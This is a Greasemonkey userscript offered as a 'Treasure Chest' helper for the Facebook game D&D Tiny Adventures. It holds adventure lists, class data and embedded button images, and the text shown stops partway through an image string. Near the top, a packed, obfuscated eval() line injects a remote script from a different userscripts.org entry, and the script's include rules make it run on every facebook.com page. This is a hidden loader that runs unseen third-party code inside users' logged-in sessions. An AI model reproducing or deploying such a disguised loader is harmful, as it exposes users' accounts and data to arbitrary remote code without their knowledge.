// D&D:TA - Treasure Chest
// version 1.0.0
// 2009-6-29
// Copyright (c) 2008-2009, Dolomite13
// Released under the GPL license
// http://www.gnu.org/copyleft/gpl.html
//
// --------------------------------------------------------------------
//
// This is a Greasemonkey user script.  To install it, you need
// Greasemonkey 0.3 or later: http://greasemonkey.mozdev.org/
// Then restart Firefox and revisit this script.
// Under Tools, there will be a new menu item to "Install User Script".
// Accept the default configuration and install.
//
// To uninstall, go to Tools/Manage User Scripts,
// select "D&D:TA - Treasure Chest", and click Uninstall.
//
// --------------------------------------------------------------------
//
// ==UserScript==
// @name          D&D:TA - Treasure Chest Plus
// @namespace     http://diveintomark.org/projects/greasemonkey/
// @description   Assists users of the Facebook app "D&D Tiny Adventures" 
// @include	  	  http://apps.facebook.com/tinyadventures*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include	      http://apps.new.facebook.com/tinyadventures/*
// @include       http://www.facebook.com/common/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var newversion = "1.0.0";
var version = "1.0.0";
var versuffix = " "

var online = "off"
var onlinex = "off"

// ====================================================================
// ===== My Facebook ID ===============================================
// ====================================================================

// temporarily removed facebook ID checking

	myfbid = "temp"
	
	GM_setValue("myfbid",myfbid)	

// ====================================================================
// ===== Arrays =======================================================
// ====================================================================

var adv = new Array(
"Curse of the Wolf Moon",
"Cutthroats of Crawling Bog",
"Sins of the Saltmarsh",
"Stronghold of the Drow",
"Book of the Four Gods",
"City Beneath the Streets",
"Heart of the Goblin King",
"Tomb of the Lizard King",
"Rescue at Rivenroar",
"The Haunted Streets of Agamentar",
"The Paladin\'s Curse",
"Tomb of Terror",
"Wrath of the Orc Lord",
"Devil of Drakewood",
"Keep on Coilspine Ridge",
"Mystery of the Moaning Mine",
"The Vampire of Fallcrest",
"Arcane Tower of Senraven",
"Fortress of the Fire Lord",
"Sleeper in the Tomb of Dreams",
"Vanished in the Night",
"Dragonjaw Dungeon",
"Glacier of the Frost Giant",
"Red Plume Mountain",
"Vale of Shadows",
"Gates of Blizzard Peak",
"Hidden Shrine of Nahautl",
"Into the Ogre\'s Den",
"Maze of Madness",
"Citadel of Sorrows",
"Monster Isle",
"Song of the Dark Druid",
"Tree Temple of the Elfwood",
"Adventure in the Forbidden City",
"Echoing Hall",
"On the Shores of Despair",
"Tower of Darkness",
"Cult of the Lizard God",
"Dungeon of Dread",
"Raid on Nightmare Castle",
"Temple of the Four Elements"
)

var wikiurl = "http://dndta.wikia.com/wiki/"

var wiki = new Array(
"Curse_of_the_Wolf_Moon",
"Cutthroats_of_Crawling_Bog",
"Sins_of_the_Saltmarsh",
"Stronghold_of_the_Drow",
"Book_of_the_Four_Gods",
"City_Beneath_the_Streets",
"Heart_of_the_Goblin_King",
"Tomb_of_the_Lizard_King",
"Rescue_at_Rivenroar",
"The_Haunted_Streets_of_Agamentar",
"The_Paladin%27s_Curse",
"Tomb_of_Terror",
"Wrath_of_the_Orc_Lord",
"Devil_of_Drakewood",
"Keep_on_Coilspine_Ridge",
"Mystery_of_the_Moaning_Mine",
"The_Vampire_of_Fallcrest",
"Arcane_Tower_of_Senraven",
"Fortress_of_the_Fire_Lord",
"Sleeper_in_the_Tomb_of_Dreams",
"Vanished_in_the_Night",
"Dragonjaw_Dungeon",
"Glacier_of_the_Frost_Giant",
"Red_Plume_Mountain",
"Vale_of_Shadows",
"Gates_of_Blizzard_Peak",
"Hidden_Shrine_of_Nahautl",
"Into_the_Ogre%27s_Den",
"Maze_of_Madness",
"Citadel_of_Sorrows",
"Monster_Isle",
"Song_of_the_Dark_Druid",
"Tree_Temple_of_the_Elfwood",
"Adventure_in_the_Forbidden_City",
"Echoing_Hall",
"On_the_Shores_of_Despair",
"Tower_of_Darkness",
"Cult_of_the_Lizard_God",
"Dungeon_of_Dread",
"Raid_on_Nightmare_Castle",
"Temple_of_the_Four_Elements"
)

var aenc = new Array(
"F#F#M#M#L#L#L#Str<br/>13",
"S#S#S#S#S#AC<br/>26",
"F#F#F#S#S#S#Int<br/>14<br/>(M)",
"M#M#M#D#D#D#Att<br/>15<br/>(M)",
"S#S#AC<br/>26#M#M#Wis<br/>13#L#L#Int<br/>13#F#F#Con<br/>14",
"D#D#D#D#D#Cha<br/>14",
"F#F#F#F#F#F#Dex<br/>14",
"S#S#S#G#G#D#Att<br/>17",
"F#F#Str<br/>13#F#D#D#D#Int<br/>14",
"G#G#G#G#G#G#G#G#G#Str<br/>14<br/>(M)",
"M#M#M#M#C#C#C#C#AC<br/>28<br/>(U)#Wis<br/>15<br/>(U)",
"F#F#F#G#G#D#D#D#Att<br/>18<br/>(U)",
"F#F#F#D#D#D#D#Con<br/>14",
"D#D#D#F#F#F#F#F#Dex<br/>16",
"F#F#M#M#M#M#C#C#C#C#AC<br/>30<br/>(T)",
"M#F#F#G#G#D#D#Att<br/>20",
"M#M#M#M#G#G#G#G#C#C#C#Wis<br/>15<br/>(U)",
"M#M#S#S#S#Att<br/>20<br/>(U)#C#C#C#Wis<br/>14<br/>(M)#AC<br/>32<br/>(M)",
"C#C#F#F#F#M#M#M#D#D#Att<br/>21",
"G#G#G#G#D#D#D#D#D#D#D#Cha<br/>16<br/>(M)",
"F#F#F#C#C#D#D#D#D#Int<br/>16",
"F#F#F#F#D#D#D#D#M#M#M#Str<br/>15<br/>(D)#Dex<br/>17<br/>(D)",
"S#S#S#S#S#M#M#M#M#M#Dex<br/>17<br/>(G)",
"M#M#M#F#F#F#M#M#M#M#Wis<br/>17",
"M#M#M#M#M#M#F#F#F#F#F#F#Con<br/>17",
"S#S#Att<br/>24#F#F#M#D#D#Cha<br/>17#M#M#M#Int<br/>18<br/>(M)",
"F#F#F#F#T#T#AC<br/>34<br/>(G)#T#T#D#D#D#D#Cha<br/>17",
"F#F#F#F#F#F#M#M#M#M#M#M#Str<br/>18",
"S#S#S#S#S#D#D#D#D#D#D#Int<br/>18",
"F#F#F#F#F#Att<br/>26#C#C#C#C#C#Cha<br/>19",
"F#F#F#F#L#L#L#L#F#F#AC<br/>34#F#Dex<br/>19",
"C#C#C#C#C#Cha<br/>17#F#F#F#F#Wis<br/>18<br/>(M)#F#F#F#F#Att<br/>27<br/>(M)",
"F#F#F#F#F#Dex<br/>18#F#F#F#T#T#T#T#T#Wis<br/>19",
"F#F#F#L#F#F#T#Int<br/>18#T#T#T#T#Con<br/>19",
"F#F#F#F#F#F#C#C#C#C#C#C#AC<br/>36<br/>(G)",
"L#L#L#L#L#L#S#S#S#S#S#Int<br/>19#D#D#D#D#Wis<br/>19",
"C#C#C#C#C#C#C#Con<br/>18<br/>(M)#D#D#D#D#D#D#D#D#Cha<br/>19<br/>(M)",
"L#L#D#D#D#D#F#F#F#F#Wis<br/>19#AC<br/>38#Att<br/>32",
"C#C#C#C#C#C#D#C#C#D#D#D#D#D#AC<br/>38<br/>(M)",
"S#S#S#S#S#S#C#C#C#C#C#Wis<br/>19#T#T#T#T#T#Str<br/>20",
"S#S#S#S#L#L#T#Int<br/>19<br/>(T)#T#Str<br/>19<br/>(T)#T#Cha<br/>19#T#Wis<br/>19#T#Con<br/>21<br/>(M)"
)
 
var xenc = new Array("C#AC#Wis","D#Att#Int","F#Att#AC","G#Cha#Str","L#Con#Wis","M#Dex#Str","S#Cha#Int","T#Con#Dex")

var xclassid = new Array("classid=9","classid=1","classid=10","classid=2","classid=11","classid=3","classid=4","classid=12","classid=13","classid=5","classid=6","classid=14","classid=15","classid=7","classid=16","classid=8","classid=17","classid=18")

var xclass = new Array("Half-Elf Cleric (Female)","Human Cleric (Male)","Dwarf Fighter (Female)","Dragonborn Fighter (Male)","Eladrin Paladin (Female)","Half-Elf Paladin (Male)","Elf Ranger (Female)","Drow Ranger (Male)","Human Rogue (Female)","Halfling Rogue (Male)","Tiefling Warlock (Female)","Dragonborn Warlock (Male)","Human Warlord (Female)","Dwarf Warlord (Male)","Eladrin Wizard (Female)", "Eladrin Wizard (Male)", "Genasi Sword Mage (Female)","Genasi Sword Mage (Male)")

var xgen = new Array(1,2,3,4,5,7,10,12)

var xrewards = new Array(
"<DIV><B>Choose one of your items to pass along to your next hero.</B></DIV><DIV style='padding-right: 6px;'>Item is chosen from your final loot when you retire.</DIV>",

"<DIV><B>Expanded selection at The Shop.</B></DIV><DIV style='padding-right: 6px;'>The Shop will have more and better items for sale.</DIV>",

"<DIV><B>Basic Class Power is unlocked.</B></DIV><DIV style='padding-right: 6px;'>Your hero has access to his or her first class-specific Power.  See class descriptions for more information.</DIV>",

"<DIV><B>New hero mode available: Ironman mode</B></DIV><DIV style='padding-right: 6px;'>Hero modes are chosen upon hero creation.  A hero in Ironman mode has to be extra cautious.  If she gets wounded . . . she\'s finished!</DIV>",

"<DIV><B>New Class available: Swordmage</B></DIV><DIV style='padding-right: 6px;'>View Swordmage class description for more information.</DIV>",

"<DIV><B>Pass along one quarter of your final gold to your next hero</B></DIV><DIV style='padding-right: 6px;'>When you retire\, your new hero will get one quarter of however much gold you end up with when you retire.</DIV>",

"<DIV><B>Advanced Class Power is unlocked</B></DIV><DIV style='padding-right: 6px;'>Your hero has access to his or her second class-specific Power.  See class descriptions for more information.</DIV>",

"<DIV><B>New hero mode available: Elite mode</B></DIV><DIV style='padding-right: 6px;'>Hero modes are chosen upon hero creation.  A hero in Elite mode has it extra rough.  All encounters are +2 difficulty!</DIV>"
)

var elfrheal = new Array();

var elfrbuff = new Array();


// ====================================================================
// ===== Embeded Images ===============================================
// ====================================================================

// treasure chest (png)

var tcimgchest = "data:image/png;base64,";
	tcimgchest += "iVBORw0KGgoAAAANSUhEUgAAAB8AAAAhCAYAAAAh3nDkAAAABGdBTUEAAAAAiyVgTQAACi9JREFU";
	tcimgchest += "WIW1l3tUFGQah59hhuEyA8wwF0CGiyCMQAzqCCKI4QU0MzM190i5Wm66m57Ntk6urV22zTqeyk2t";
	tcimgchest += "SMyUcvECoZF3CVEEER1xuAleUGFkwOEOw3UG9g/WjudkW3tqf/9/53l/3/d+70XIby/HePCqBx0w";
	tcimgchest += "EZADA4ANsP8feDgD44DlwC7gBjAEDKNaYFuy5PUarTZ5H7AGUN0/JPgVQCcgCkgE4oHIaBgdCfgE";
	tcimgchest += "ga0WwpbDjU49FQ5JPBIWQUuzidTU9Tn/CaJe+D/AHABPIBp4AdhI0NyXnp2X8oSrS6C2v99NPrun";
	tcimgchest += "jvnLQB4EgXPj6XMKZPEzj+PWf54jBZ1Ex07Fzy9cW1qaFwAcFv0CYCgQCUwFElUQrgeHCiChtg4m";
	tcimgchest += "6Xhs7hzUCiXVN27wtSGbpfM9UYyJIHr0aFywoY3UI31zE5ua7mKpPHoXKANED7t2ARABPAokBAXN";
	tcimgchest += "jqqtvTYGakUrgMlAJ+Cu19NsMKBJWcABQzf6Z/+Av8aP2w0NlH63jb+s1NHWO8wVQxEnvjRQDH1A";
	tcimgchest += "FrANKLkP4uTJkw7Jyclx+qCgJLmPzzSHgYGwzv5+T1NZmYMk4mmmxE8g0D+Qa0YjiswDJKdMYkil";
	tcimgchest += "RhUYyFh/f4zGy7ycepEpS5/gbl0dWVkfPGimGygGPgLyGMn8H1y6AC/PjI/fMHv6dJcZ06YhlUgQ";
	tcimgchest += "iUS0trVRXlHOnsxjaLSJ6PUx3KyvY7BgHy89+xTOMhl3TSYMhYWsOXTop57u+ByiVx7lYv3DrnjV";
	tcimgchest += "opkz/xkeEeHi4eGBq4sLXmo1Pj4+jPLxwcnJiZu3avnb2+8SFZeCh7ucb77NYUL3eey1JjJ+JmlQ";
	tcimgchest += "0YWFy8ABYB/Q+gM8Qauti5061U/g4IBEIsHa3Y3YyQmxoyNisZjkpCTaOzpITfuczOMnfw7FKyvA";
	tcimgchest += "Q6XH2mIg7xB4LVrCkL2fi6UldstFUxWw8z+BmAWxKtVwVEICcpWKrq4uvL29uVlVxb2WFrp6ehgE";
	tcimgchest += "iisrfwSJB3TzIXHxMtwFYDKm09gI0fMT0U2K48qF98j9HAqOQ8jcIAiewLBATF3tHQovF17FxC7R";
	tcimgchest += "oJsbEomExvp6vAMCeGPz5p90laABhWnk7zlqwN0HwsdAvQkaLWDcDVJFPs3mSrp6dDz251ae37Qa";
	tcimgchest += "U3khx1Kz2NIFerUOTIQBm4TT9Pq3uzo7kSuVbN6160fACGDTliA+/PAtvDUWpMFmIlbOR5PkDW23";
	tcimgchest += "yX7NSKfIyCidHs0MFWZjE+c+6kExpglNYCfDjn5UXi0iZ2cn5iYVcxKfZO3aDSgU/oMCYHhebCw5";
	tcimgchest += "xcUAaIHR0WAzQ7gYHHTgGwT9jVCTAfM+UxE2ZRlOEg8Kv3uDin3gFQXTn4NA7YeUF+7gfHoNWZng";
	tcimgchest += "BxwCUlJeZPqMOCbFxOHkJOX48QJKSop7BMAwwKdArwo83lxClD4IpcLK94c+5twxmJSsQSA0YW0A";
	tcimgchest += "QSu09EGfCNzVMym7ZCSw0ELYKnAMBYsZzqTDYYuGf7y3nqlTYggMDKCnZ5iCc0X0WvsZNy6CjIzs";
	tcimgchest += "LtGIVymXMSC0QFhbE5bGFmx9VhrrAFcIHT+WsVEbcRi6zhfvvQtmmL16KWKPJpTyUNYUWkjcDvlA";
	tcimgchest += "YuxSlm9+hk8SonBxceZOfRd7M45guX4KN1sGVsU7xMXFIhQKbQJIHp47bwJDYmduXiujpiwbgJWA";
	tcimgchest += "mpHypF01kmASDyjOhFkvQPDkjZzO/Zg//snCvPkrmTlzMrGTYmhpHsZu70Hu6cHB/YcR9x4j0qWN";
	tcimgchest += "0MTHkao8ef/TOrS6GKqqDM0ClWrBcFLSOHBwwM1NTl+vFXPjXU4eNxJEPo8xMg34aaDFBDlAxCJo";
	tcimgchest += "skHYmI9ImjUZbehopFI5DQ1NWK3QdK+FvMM5JE3tIuaRcGqzS+jodqC2r5Qm5UKWP7+CTz75qkkU";
	tcimgchest += "GuqFVOrGwbQvUFOJauY6tKEhvLhaS3tnMrlVFdQYMog3QR8qfBfNYcrchUyJn4BS6cmgbYjyilsc";
	tcimgchest += "ydrMiWOVnCzYh0LlzoVTMEruzqXT1Qxe78NRJkV43Z3b1mZO5ZbQ3GyxCevrlW+3MciTYQb+nvYW";
	tcimgchest += "js2nOPjZEdqdVfiPUhMWEoKzSxAFty7w161fs3bNSqKjw+nrH+JMgZGMrWl03XifJ5JC6LPacVFG";
	tcimgchest += "UlV1jcbGRkqPHaFHEU719RoCPGU03LpBhyYEvV7HnTumdlFEhCcqhRJXsQ8qhYLxmgD2fjmZItNt";
	tcimgchest += "1rx5nsTpCXR1tAPQ1tpFTs5Z1F5K8r45RExELQun+NJujWWUty+urq3IZRIkrqO4dGkI30fiEA7Z";
	tcimgchest += "cJ84gaKyMmQ9bShkbgSODsDZ2WXQwdNTRnCgmsuHWzm9NR3n9iAGzAMsWfI7jLmLyc8rIjw8fKSk";
	tcimgchest += "xkcxaZKevAN7ee45dxYuTaGhxwOzPZzMry5w+dRNRvnK0PipEQyDXCbDPjSE05Adi7OI1yprGbA7";
	tcimgchest += "k/PtGerq7iIqKLjNoFCEKxL8VbE0t93D3mCnM68C/2AJWg3Y7DYA1GoP3NylyH3cEbR1UpzxPbes";
	tcimgchest += "SiSSXmzKYGz+Qq6U3sHcaELh7obZXIO5yczOrEOsXfs2h4+sw8fbj5KSUhoabt0SgQhnsYguRLQ0";
	tcimgchest += "mnGVyck0FBETFkLJmf3UmJoQVYw0lsLCSqw9vZg67BR+foKgwIn0V5/EYdYsBvt7uWtuJSTEi4AA";
	tcimgchest += "T/bUlLP501Re37CFs2ffQaFQUl19lbS0LbXbt3+wG8gUJST4ERDoRxdChh1F5Fy/jrdej5uzmKt9";
	tcimgchest += "vgCEjAmisgx8fVW4urpyorgYZUg0/QM2JkRGcvX0abrHhuDmLkYkEjE0BI9Om8GSZ24gl0u4cqWa";
	tcimgchest += "rVu33czK2rEbSAfqAUTV1XdRKOQcopXsL3fz6qpVjPLywnLvHmG68WhK2vCUyQEIDvZBJpOhEghw";
	tcimgchest += "EQlxEQgZ6O/Fz9+HdTt3M2/+K9y508y9e2ZiYyMwGo2sX7+/PDd354EHofclsljqcXQcT0rKCk6d";
	tcimgchest += "LSR9+3aeevpppO5uTJyox2TqoKqqGoCiogqEYieCZc4MtVpobW4hO78Q+fRl7Eo/TvxkHXa7mJqa";
	tcimgchest += "Ktat23g1O3vrLiAbuPmwFi0Cw4WamoDxEydOFi9+cgH3WhM4mFuAxZLJS7YBoB9wBEAqdUbs5Ep9";
	tcimgchest += "Uzs5OTlo4pfx+8yNxEyMxEEwzIWSy8Opn229lp9/OI2RkanhYdD7Eoy0DhYCS6OjlyaMHRvuLPeU";
	tcimgchest += "0dDQxJn8s6jVUqKjp7J796vU1NTj6upBenoOoVo1cZOnMDjYQXFxOdu3f2XIz9+TAfwLaPpv0Afh";
	tcimgchest += "9yUHpoPq+ejoWUk63XhHicQVq9WK2Wzh6NFN7NmTi7e3Ep1uLD093RQUnCMn5/vSzMxtu4Bvgbpf";
	tcimgchest += "An0Y/L4kQAKwOiFhZWJISKjUaDRgMOwlNfUIHh4SBIIe+44dGeV5eXvSgP08MJH+VhICyaDaq9Mt";
	tcimgchest += "swDDGzZsG1q0aHUh8CIje9uv0i/ZUsWM7GlzgSrgO8D8a8EA/wYWIvSxazlcAQAAAABJRU5ErkJg";
	tcimgchest += "gg==";	

// getwell (gif)

// var tcimggetwell = "http://2974.voxcdn.com/ta/WebGraphics/Buttons/GetWell.gif";

/*
var tcimggetwell = "data:image/gif;base64,";
	tcimggetwell += "R0lGODlhJAAYAMQeANvAqNe0UenStOjb1+rPV/bx8IxAC9S4qMWZUqdrMbyLVfzrw5NLD8qpm9zI";
	tcimggetwell += "wv/vxptYJrmHO9i2ic6me652Sffkv+THm96+kMOfkn8oAP/xyJ0SDv/yyv/yyf/////xySH5BAEA";
	tcimggetwell += "AB4ALAAAAAAkABgAAAX/oCeO3mCeaKoOZCsWDnYAdG3f94E5hes5DYHmw/lojp3Pp/N4dI7K59Ao";
	tcimggetwell += "aDhajsNCyekUiUTNApGwNMNT7uJwFQ0aj+/SOJlcJAhIZp+YSCQTFklgTA0sHhgVSothBnt8AQER";
	tcimggetwell += "DI8ZCnKLFRglAGBfXR0QDJEEpaaRERkTjGAfAAMHAqyLGqKmtwSRCBkXg4NdAgANW1GLHA+2pRvL";
	tcimggetwell += "GwG5qRbGgx8LDRis07UMpszNqLysHF0fGBhJHeityBABBgzdDAwIuxKzYOVci15PBgkB3d0iIDCw";
	tcimggetwell += "ypg+fK3yaTAQ4R/AZQINKAi3CCGmJBrkOXwokAEFe0oQznoCoWGkBMzmrM3zqCHdHCMYhuVj9ICB";
	tcimggetwell += "yQAolylAoECBAQouGVUDIAubEQgGAsyLkKBpTwUJVDGaJuDAgE7FwGiwkAGCSp5Po0J4MHXRK0QV";
	tcimggetwell += "psl5IMERBAo9KSSglEDRSE1uDpBdMuiIBgE+M7jbA6GgsS4cNFgdkSWOnClJKkjQQyGavqkP2GAJ";
	tcimggetwell += "8hKKOCVNhhSZNqdKmxYFhBEVwLq169euhTk45MNDgQEOcuvezZv3gB4tQgAAOw==";
*/
	
var tcimggetwell = "data:image/png;base64,";
	tcimggetwell += "iVBORw0KGgoAAAANSUhEUgAAACQAAAAYCAYAAACSuF9OAAAABGdBTUEAAAAAiyVgTQAABNNJREFUSImt";
	tcimggetwell += "l91vU2Ucxz+nbdZybNetpdtKl228zLU2bLCqGBCvJoEQBV+jCZdeGC+88k+QC+MLd8Z4IRrjhZoQE0IU";
	tcimggetwell += "WJTwouDcYJDRjTFYB6Vbu5a1nV1b0h0vTs9Lz2kHKt+b85zn+Z3f8/29PL/ndwTWwPx0VFpr/b+iozck";
	tcimggetwell += "NFozLRSyS9K96FUS0Su0+tuwOx4vmVIR7ieS+EPb2BDqR3S31HCoebl58ayUiU3RHfLT1r1eXhYEkCRA";
	tcimggetwell += "5yxB0F4FoFKRx1ZrVVanWsA8h0QytkgsmsDT3ceW515QeaiDmxfPSsWlewQjAaxNTdrGSLKYolQhKAgg";
	tcimggetwell += "rVIpP+DSsSPMXY2x+9C7BIJhWc5iVWXq2A6CQKVUYnI0jqNlg0pKADlX5sbO88yeMFhtOosUC2WrLp84";
	tcimggetwell += "DkBLh49ysUT6ziWun5ng7tiUKh4citC3ay9iSzMAhaUcbRt7CIT7dV5VjJK9O3Jqgq7B5+noDQk2gOnz";
	tcimggetwell += "p3n6xa2yVZIhjyVNwa9fHiafqF0ODkV469ODAMxdS3Hj3A0mhw/XyOx+5w0C4QFURsoekuzJrbu28Nfp";
	tcimggetwell += "0wDY5qejUj4+jsMlGsKhCxHynNvfh13MMPTeLgC8AXvNxt5AJ9v3dpKOl1SCv399AU/gSbOhOk85XCId";
	tcimggetwell += "G9uYn45KtsWZcXwbnAbmuo/VsTZnJNIITk87IIdYCz3aWDEeiWaPk1x8HFshm8cbCRiY1+wvf6ScJAOO";
	tcimggetwell += "7/m+5n3n0YN4A3bS8RLLmQUAmtY9UasPAQRJIwV4/W5i0QS2UmFFO1UKJAMpSQKLZW136KCETEF55W+D";
	tcimggetwell += "fn06yBtam5ooFVawKYRVEjWkdLm0Kh9fh9tDOl7ixCc/YRd9iAYyw59fAGDwwG41ZOViibow5ilgUTdX";
	tcimggetwell += "mNXUwGqMBcBiIZuYwumR8611AsSRlGkPcSSFOJJSw+Xyy0ffBEFnvVICVEKNYM5nPJ3//i7JxG/U0S0Z";
	tcimggetwell += "SD0KIQMbu+hTw/CosIs+cql8A9XmUmB7mIA+wR1uD8uZBTwBHzuPysXwys93KPwwqooHP3y1ATWdR4zH";
	tcimggetwell += "XzdpsYvrqJTL2neC4c5RZFdXKWYzDTbTsJKzqs+VnJVSIVWrV2+zblwpP8AursPW2u4incjS1u2rChm8";
	tcimggetwell += "pFhhseBwe7h28gJdWw+SicvR9nQ64M1IXVKp2VvkE9CzLWKoQ5hqXTqRRXS7sLgCA+Qyy2bhOi/73v+A";
	tcimggetwell += "fALOfxdV55yedrr6u/H1bMLXs0mdT83eYnJ4lM7BPrbv28/DkMsss37zAJaO3pAwfztJMV/QtytVLro6";
	tcimggetwell += "hEAgGObtIx+RTUxx6rNjXD8zwcJMQfVILpUnNXuL6G9nmBweJTgU4dDHX8iXthG6PCrmC8zfTtLRGxLU";
	tcimggetwell += "9mNxZpzwji7tYyM5nX+TsUWunfyGKyd+JJ+Qa41d9LE4I+dL52AfkZdeZ/v+l81EBL1iuV+a+GOW9ZsH";
	tcimggetwell += "NEKgNWjhHV1yTwSGfNKV8mr8i/kCsat/cu7br7g7NsXAgb08+8prBJ7qN5Cgfg5VKkxcmjM3aHpSWgvr";
	tcimggetwell += "q3ss1bZWT3i1evFaLNq6Un0bJHMyllq7hVVQyC5J8cu/cH8hT2u7i+bqVfG4kMssc38hj6e7D6fXZ/oD";
	tcimggetwell += "afg7UsguSblkguW0+b76P3B6fTS3+U1/Gwr+AZ+QBi2nWVnXAAAAAElFTkSuQmCC";
	
	
var tcimggetwell2 = "data:image/png;base64,";
	tcimggetwell2 += "iVBORw0KGgoAAAANSUhEUgAAACQAAAAYCAYAAACSuF9OAAAABGdBTUEAAAAAiyVgTQAAA5dJREFUSInN";
	tcimggetwell2 += "l09LMl8Uxz8OisigaMgkiAiTCkGCYKtI+rOIoE2baOcLiF5KbyFo0SaiTQsXLYKwNpVhJC1MBlxM6SA5";
	tcimggetwell2 += "KDaIMD6LcHjMasYfz+L3Xc2999zv/d455557rotfoCjK8Lfx/wpZll0/jU0MdDqd4cvLC7VaDUmS8Hq9";
	tcimggetwell2 += "/1RMv99H0zQSiQTJZJJAIDCmYaxRKpWGqqqSSCSIRqOOFzFNEwBBEBzPUVWVWq1GNBolm81aOqyPUqk0";
	tcimggetwell2 += "7HQ6pNNpPB6PY+LBYEChUKBarbK9vc3c3JxjcYPBgKenJwKBgCXKBZ+xUqlUyOVyvxJdXl4CEA6H6ff7";
	tcimggetwell2 += "vL6+cn9/j6Iolk0mkyGbzeL3+wHodrvEYjGSyeS3nKZpUiwWWVhYQJZllxvg7u7OVgzA2dkZuq6P9WUy";
	tcimggetwell2 += "Gfb39wGoVqs8Pj5yeHg4ZrO1tfWjIEEQWFxcpFgsAuBWFGXYaDQQRfFXMQAzMzN4vV52dnYAkCRpbFyS";
	tcimggetwell2 += "JJaXl9E0zRJ4cXFBJBL5lVcURWKxGIqiDN31ep3Z2VlbMV8XdoJgMAh8utiJbaPRwN3tdkmn07YTRifp";
	tcimggetwell2 += "Kw4ODsba+XweSZLQNM1yr8/ns+WXJIlarYZgGIajUzXNkR65bATDMGzneDweDMPA7XSR0R8SRRFN0zg+";
	tcimggetwell2 += "Pv42aZ6engKwsrJiuazf7ztdBsfbFgSB9/d3AoGAJfC7nRuGgWEYlruCwSDdbvffCxrBaUD/jUaj4dh2";
	tcimggetwell2 += "KkFer9dywzRz2u22Y3vHMQSf8aPrOpIkkc/nAbi+vh7L1Jubm9NQTkDw+XwMBgNbQ9M06fV6tnYjm16v";
	tcimggetwell2 += "R6/XcxzQg8EAn8+HOxwOo2ma7e0uCAKiKHJ7e0sqlbKO9ncxNRKlqiq6rjM/P28rSNM0/H4/QiQSmbif";
	tcimggetwell2 += "fkI+n0fXdQqFgtUXDAZJpVJEo9GxTamqSrlcRpZlVldXbbl1XScej3/e9icnJ8NcLmd7n5mmSalU4ujo";
	tcimggetwell2 += "CF3XkWWZSCRCKBQCoN1u8/HxwdvbG81mk0wmw97eni1vr9ejWCyyu7vrssqPer1OJpNxlJFVVeXq6oqb";
	tcimggetwell2 += "mxt0XScYDOL1emk2mwDIssza2hrr6+u2XAAPDw/E43FkWXZNFGhORY129vz8zPn5OYqisLS0xMbGxo+l";
	tcimggetwell2 += "xleYpkm5XJ4s0P4W9b8pYUfodDrDSqVCq9UiHA5PnQjtoOs6rVaLaDRKKBSaeIH8+BzpdDrDVqs1VZZ1";
	tcimggetwell2 += "glAoRDgcnnhtjPAHUyWXfMh4BsQAAAAASUVORK5CYII=";
 
	

// buff (png)

// var tcimgbuff = "http://2974.voxcdn.com/ta/WebGraphics/Buttons/Buff.png";

var tcimgbuff = "data:image/png;base64,";
	tcimgbuff += "iVBORw0KGgoAAAANSUhEUgAAACQAAAAYCAYAAACSuF9OAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJ";
	tcimgbuff += "bWFnZVJlYWR5ccllPAAABHxJREFUeNrEl+trW2Ucx785t1yapOkll3YV066drjauVlsmFO1EoeIN";
	tcimgbuff += "dA6RwV7Mt74QBUVBfOMfIPhWRVDxpd1E2AYV56zFFrq2lt6W0DRrmjaXJjmXnPvxOWftXtqkk/qD";
	tcimgbuff += "h+SE5/k9n/N7nt/394sL+/bnVx92BCKRqXwqFTc0DcdhDMehPR5feXRsbJAOPKnYv7kcmK8/ijbH";
	tcimgbuff += "YjmOKuOh0zHQDHUsQLpmIDV/F2DDODU6yhEozdk5GA7fZl17iCc6jw3GiRBL49RTD8OUd7E8OXnT";
	tcimgbuff += "idDPn74VCUbads6+mgBFHw1GN0wsbezi8Z4oXC5Xw+s1Rcf0lQVUd/JNFM1xb0bjrUeGWbtbxPe/";
	tcimgbuff += "boBqHceXE7PY3K007IN1M2g/EYJpGGMU63a/GIoGjwSzkNrB3IaOC+c/RrA5jKHhi7g6ncSdbKlh";
	tcimgbuff += "XzaD2+9/nqJoesAX8DTsYGY1i81KEG+89gE4xo1wSztCwTaEu57BL9MpLG8WGvLX1EwYLKuP0WSZ";
	tcimgbuff += "Zj1MQ4unljJQ2T6Mv3Bh/w7pzvB6vKBpN0paFNdmUs7dSnRH6pQAxr5/bUyjkbm5kEYgMoqRgXOw";
	tcimgbuff += "yLNBQGRFIUN2hqbrqJF0zuQMGGaSPBsY6us41C9FstvQdVdDQL/Nb6Cj+2X09Aw5MBoR0AMQWVVQ";
	tcimgbuff += "FXnwogBV07HH1zA5XyHANpiF4Uc664tUXWlJ3vL3xU30JS4iFj3pbKLpmhMZSa5B1VUIoojszjay";
	tcimgbuff += "u1kU9orgJRGVqoifpsr7R2ri6f6uBwey33TuTg79Q5fha2pDmS8TCJlAaTBNE6JEgDQVuSIRt+Qq";
	tcimgbuff += "FteXkS8WUCruoSZJ0E0dP9wQyHwTvZ0tCIeaHgzITu3exCUsb2RAU1tQ1XsgLsoFlmEJnOREanM7";
	tcimgbuff += "g9ml28jlcxAEEaLAY7CPZF6Ac+amcwV8d2Me775+Fsy/aN6hQLb6zi1+64AdWFt0CCXJgsftIZlq";
	tcimgbuff += "IV8qYiW1hq2dLImYCEVWYFgmhvtPYKS/21nDsQzOEF/MIQJ8KFBLwIvnnuh2hm0Tf6xgcSsN1fKj";
	tcimgbuff += "yetDTVWRyiSRTKfACwK5WyoUSd4v2xZ6OlvRHQvVX9+OotBVoQKVbEbTNPnOkyPTYMB0JMAkGWUf";
	tcimgbuff += "6VFLEeOiKNMyrYYWlcpFCLoCRVFJhGRyr0grY8IBUYQaLPIJUskbMUM17P7IYGiWrSqS6hS4uoEq";
	tcimgbuff += "ZWRJam8znCOEilKDQDLq4Khoorp2hOz7Va/JhIHMTzNEHaeFPWnA3+Krrwj6PaR/kSCVquANi6ir";
